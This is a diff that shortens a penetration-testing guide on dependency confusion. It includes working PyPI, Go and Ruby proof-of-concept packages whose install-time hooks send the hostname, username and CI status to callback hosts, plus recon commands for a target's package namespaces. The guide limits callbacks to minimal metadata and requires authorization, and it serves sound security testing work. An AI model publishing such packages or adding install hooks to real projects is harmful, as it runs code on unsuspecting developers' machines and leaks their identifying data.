@@ -151,19 +151,10 @@ gh api search/code \
 ### Additional Recon Sources
 
 ```bash
-# Job postings mentioning internal tools and libraries
-# Search job sites for "targetcorp" + technology-specific terms
-
-# Docker Hub: check for organization images with dependency metadata
-curl -s "https://hub.docker.com/v2/repositories/targetcorp/?page_size=100" | \
-  jq -r '.results[].name'
-
-# npm: check organization scope
+# Docker Hub, npm org scopes, PyPI author search
+curl -s "https://hub.docker.com/v2/repositories/targetcorp/?page_size=100" | jq -r '.results[].name'
 curl -s "https://registry.npmjs.org/-/org/targetcorp/package" | jq -r 'keys[]'
-
-# PyPI: search for packages by author/maintainer
-curl -s "https://pypi.org/search/?q=targetcorp" | \
-  grep -oP 'class="package-snippet__name">[^<]+' | sed 's/.*>//'
+# Also mine job postings for internal tool names and library references
 ```
 
 ---
@@ -296,92 +287,45 @@ index-url = https://pypi.corp.example.com/simple/
 # Public PyPI is no longer consulted
 ```
 
-### PyPI PoC Package Structure
-
-```
-offensive-poc-package/
-  setup.py
-  setup.cfg
-  PKG-INFO
-  offensive_poc_package/__init__.py
-```
+### PyPI PoC Package
 
 ```python
-# setup.py -- full PoC with multiple hook vectors
-import os
-import sys
-import socket
-import urllib.request
+# setup.py -- PoC with install/develop/egg_info hook vectors
+import os, sys, socket, urllib.request
 from setuptools import setup
 from setuptools.command.install import install
 from setuptools.command.develop import develop
 from setuptools.command.egg_info import egg_info
 
-CANARY_HOST = "canary.researcher.example"
-PACKAGE_NAME = "internal-data-pipeline"
+CANARY = "canary.researcher.example"
+PKG = "internal-data-pipeline"
 
 def safe_callback(phase):
-    """Send a safe DNS and HTTP callback with minimal metadata."""
+    """DNS + HTTP callback with minimal metadata. No secrets, no file access."""
     try:
-        hostname = socket.gethostname()[:30]
-        user = os.getenv("USER", os.getenv("USERNAME", "unknown"))[:20]
-        ci = "1" if any(
-            os.getenv(v) for v in [
-                "CI", "CONTINUOUS_INTEGRATION", "BUILD_ID",
-                "GITHUB_ACTIONS", "GITLAB_CI", "JENKINS_URL"
-            ]
-        ) else "0"
-
-        # DNS canary -- works through most firewalls
-        label = f"pypi-{hostname}-{user}-{phase}-ci{ci}"
-        label = label.replace(" ", "-").replace(".", "-")[:60]
-        try:
-            socket.getaddrinfo(f"{label}.your-id.interact.sh", 80)
-        except socket.gaierror:
-            pass
-
-        # HTTP callback
-        data = (
-            f"pkg={PACKAGE_NAME}&host={hostname}&user={user}"
-            f"&phase={phase}&ci={ci}&py={sys.version.split()[0]}"
-        ).encode()
-        req = urllib.request.Request(
-            f"https://{CANARY_HOST}/pypi-confusion",
-            data=data,
-            method="POST"
-        )
-        urllib.request.urlopen(req, timeout=5)
-    except Exception:
-        pass
+        h = socket.gethostname()[:30]
+        u = os.getenv("USER", os.getenv("USERNAME", "unknown"))[:20]
+        ci = "1" if any(os.getenv(v) for v in
+            ["CI", "GITHUB_ACTIONS", "GITLAB_CI", "JENKINS_URL"]) else "0"
+        label = f"pypi-{h}-{u}-{phase}-ci{ci}".replace(" ", "-").replace(".", "-")[:60]
+        try: socket.getaddrinfo(f"{label}.your-id.interact.sh", 80)
+        except socket.gaierror: pass
+        data = f"pkg={PKG}&host={h}&user={u}&phase={phase}&ci={ci}".encode()
+        urllib.request.urlopen(urllib.request.Request(
+            f"https://{CANARY}/pypi-confusion", data=data, method="POST"), timeout=5)
+    except Exception: pass
 
 class InstallHook(install):
-    def run(self):
-        safe_callback("install")
-        install.run(self)
-
+    def run(self): safe_callback("install"); install.run(self)
 class DevelopHook(develop):
-    def run(self):
-        safe_callback("develop")
-        develop.run(self)
-
+    def run(self): safe_callback("develop"); develop.run(self)
 class EggInfoHook(egg_info):
-    def run(self):
-        safe_callback("egg_info")
-        egg_info.run(self)
+    def run(self): safe_callback("egg_info"); egg_info.run(self)
 
 setup(
-    name=PACKAGE_NAME,
-    version="9999.0.0",
+    name=PKG, version="9999.0.0",
     description="Security research PoC -- dependency confusion -- contact security@researcher.example",
-    author="Security Researcher",
-    author_email="security@researcher.example",
-    url="https://researcher.example/dependency-confusion",
-    cmdclass={
-        "install": InstallHook,
-        "develop": DevelopHook,
-        "egg_info": EggInfoHook,
-    },
-    python_requires=">=3.6",
+    cmdclass={"install": InstallHook, "develop": DevelopHook, "egg_info": EggInfoHook},
 )
 ```
 
@@ -451,48 +395,27 @@ Java ecosystems resolve artifacts by iterating through configured repositories
 in order. If Maven Central is listed before a private repository, an attacker
 can claim the groupId:artifactId on Central.
 
-### Maven
-
 ```xml
-<!-- pom.xml with vulnerable repository ordering -->
+<!-- pom.xml: Maven checks central first; attacker claims com.targetcorp:internal-lib -->
 <repositories>
-  <repository>
-    <id>central</id>
-    <url>https://repo.maven.apache.org/maven2</url>
-  </repository>
-  <repository>
-    <id>internal</id>
-    <url>https://nexus.corp.example.com/repository/maven-releases/</url>
-  </repository>
+  <repository><id>central</id><url>https://repo.maven.apache.org/maven2</url></repository>
+  <repository><id>internal</id><url>https://nexus.corp.example.com/repository/maven-releases/</url></repository>
 </repositories>
-<!-- Maven checks central first; attacker publishes com.targetcorp:internal-lib -->
 ```
 
 ```bash
-# Check Maven Central for availability
-group_id="com.targetcorp"
-artifact_id="internal-auth-lib"
-group_path=$(echo $group_id | tr '.' '/')
-code=$(curl -s -o /dev/null -w "%{http_code}" \
-  "https://repo.maven.apache.org/maven2/$group_path/$artifact_id/maven-metadata.xml")
-echo "$group_id:$artifact_id - HTTP $code"
+# Check Maven Central for groupId:artifactId availability
+group_path=$(echo "com.targetcorp" | tr '.' '/')
+curl -s -o /dev/null -w "%{http_code}" \
+  "https://repo.maven.apache.org/maven2/$group_path/internal-auth-lib/maven-metadata.xml"
 ```
 
-### Gradle
-
 ```groovy
-// build.gradle with vulnerable repository ordering
+// build.gradle: Gradle checks mavenCentral() first -- same vulnerability
 repositories {
     mavenCentral()
-    maven {
-        url "https://nexus.corp.example.com/repository/maven-releases/"
-        credentials {
-            username = project.findProperty("nexusUser") ?: ""
-            password = project.findProperty("nexusPassword") ?: ""
-        }
-    }
+    maven { url "https://nexus.corp.example.com/repository/maven-releases/" }
 }
-// Gradle checks mavenCentral() first
 ```
 
 ---
@@ -524,28 +447,16 @@ cat go.sum | awk '{print $1}' | sort -u | \
 // Go module with init() callback for PoC
 package confusionpoc
 
-import (
-	"net"
-	"net/http"
-	"os"
-	"os/user"
-	"strings"
-)
+import ("net"; "net/http"; "os"; "os/user"; "strings")
 
 func init() {
 	hostname, _ := os.Hostname()
 	u, _ := user.Current()
-	username := "unknown"
-	if u != nil {
-		username = u.Username
-	}
-	label := strings.ReplaceAll(hostname+"-"+username, ".", "-")
-
-	// DNS canary
+	uname := "unknown"
+	if u != nil { uname = u.Username }
+	label := strings.ReplaceAll(hostname+"-"+uname, ".", "-")
 	net.LookupHost(label + ".your-id.interact.sh")
-
-	// HTTP callback
-	http.Get("https://canary.researcher.example/go-confusion?h=" + hostname + "&u=" + username)
+	http.Get("https://canary.researcher.example/go-confusion?h=" + hostname + "&u=" + uname)
 }
 ```
 
@@ -562,25 +473,16 @@ curl -s "https://rubygems.org/api/v1/gems/corp-internal-utils.json" | \
 ```
 
 ```ruby
-# Gemspec with post-install callback
+# Gemspec with post-install callback via ext/extconf.rb
 Gem::Specification.new do |s|
-  s.name        = "corp-internal-utils"
-  s.version     = "999.0.0"
-  s.summary     = "Security research - dependency confusion PoC"
-  s.authors     = ["Security Researcher"]
-  s.extensions  = ["ext/extconf.rb"]
+  s.name = "corp-internal-utils"; s.version = "999.0.0"
+  s.summary = "Security research - dependency confusion PoC"
+  s.authors = ["Security Researcher"]; s.extensions = ["ext/extconf.rb"]
 end
-
 # ext/extconf.rb -- executed during gem install
-require 'socket'
-require 'net/http'
-hostname = Socket.gethostname
-user = ENV['USER'] || 'unknown'
-begin
-  Net::HTTP.get(URI("https://canary.researcher.example/ruby-#{hostname}-#{user}"))
-rescue
-end
-# Create dummy Makefile so the gem installs
+require 'socket'; require 'net/http'
+h, u = Socket.gethostname, (ENV['USER'] || 'unknown')
+Net::HTTP.get(URI("https://canary.researcher.example/ruby-#{h}-#{u}")) rescue nil
 File.write("Makefile", "all:\n\ttrue\ninstall:\n\ttrue\n")
 ```
 
@@ -616,61 +518,35 @@ services:
 
 ## Safe PoC Methodology
 
-Every dependency confusion engagement must follow safe PoC practices. You
-never deploy destructive or exfiltration-capable payloads.
+You never deploy destructive or exfiltration-capable payloads. Every PoC
+uses safe callbacks only.
 
-### DNS Canary Setup
+### DNS Canary Options
 
 ```bash
-# Option 1: Use interactsh for DNS canary
+# interactsh (preferred -- free, reliable OOB detection)
 go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
 interactsh-client -v
-# Provides a unique *.interact.sh subdomain for callbacks
-
-# Option 2: Use Burp Collaborator
-# Generate a Collaborator payload from Burp Suite Professional
-# Monitor the Collaborator tab for incoming DNS queries
-
-# Option 3: Self-hosted canary
-# Set up a DNS server that logs all queries
-# Use your own domain with NS records pointing to your server
+# Burp Collaborator -- generate payload from Burp Pro, monitor Collaborator tab
+# Self-hosted -- run a logging DNS server on your own NS-delegated domain
 ```
 
 ### Callback Data Constraints
 
-You collect only the minimum metadata needed to prove execution and identify
-the affected system.
-
-```
-ALLOWED callback data:
-  - hostname (os.hostname / socket.gethostname)
-  - username (os.userInfo / USER env var)
-  - CI indicator (CI / CONTINUOUS_INTEGRATION env var -- boolean only)
-  - operating system / platform
-  - package manager version
-  - timestamp
-
-NOT ALLOWED:
-  - file contents
-  - environment variable values (beyond CI boolean)
-  - credentials, tokens, or secrets
-  - network configuration details
-  - directory listings
-  - process listings
-  - any form of persistent access or reverse shell
-```
+Collect only what proves execution and identifies the affected system:
+hostname, username, CI boolean, OS/platform, package manager version,
+timestamp. Never collect file contents, environment variable values beyond
+the CI flag, credentials, tokens, directory/process listings, or any form
+of persistent access.
 
 ### Package Description Template
 
+Include in every PoC package published to a public registry:
+
 ```
-Security Research - Dependency Confusion Proof of Concept
-
-This package was published as part of an authorized security assessment.
-It contains no malicious functionality. The package sends a DNS query
-and/or HTTP request to a researcher-controlled server to confirm that
-dependency confusion is possible in the target environment.
-
-Contact: security@researcher.example
+Security Research - Dependency Confusion Proof of Concept.
+Authorized security assessment. No malicious functionality. Sends a DNS/HTTP
+callback to a researcher-controlled server. Contact: security@researcher.example
 Report reference: [ENGAGEMENT-ID]
 ```
 
@@ -733,20 +609,14 @@ tar xzf *.tar.gz && cat */setup.py
 | 11   | Remove PoC packages from public registries        | `npm unpublish` / PyPI delete       |
 | 12   | Deliver remediation: registry pinning per ecosystem| Report template above              |
 
-**Timing considerations:**
+**Timing**: CI/CD callbacks arrive within minutes of a commit; developer
+workstations may take days or weeks. Keep canary listeners running for the
+full engagement window.
 
-- CI/CD pipelines run on schedules -- expect callbacks during business hours or on commit.
-- `npm install` and `pip install` in CI typically run within minutes of a commit.
-- Developer workstations may not pull new dependencies for days or weeks.
-- Set your engagement window accordingly and keep canary listeners running.
-
-**Legal and coordination notes:**
-
-- Confirm scope explicitly includes publishing to public registries.
-- Pre-coordinate with the target security team for public registry publishing.
-- Document the exact package names, versions, and timestamps of publication.
-- Maintain screenshots of the package listing with the security research description.
-- Remove packages promptly; do not leave PoC packages published beyond the engagement.
+**Coordination**: Confirm scope includes public registry publishing.
+Pre-coordinate with the target security team. Document package names,
+versions, and publication timestamps. Remove PoC packages promptly after
+the engagement window closes.
 
 ---
 
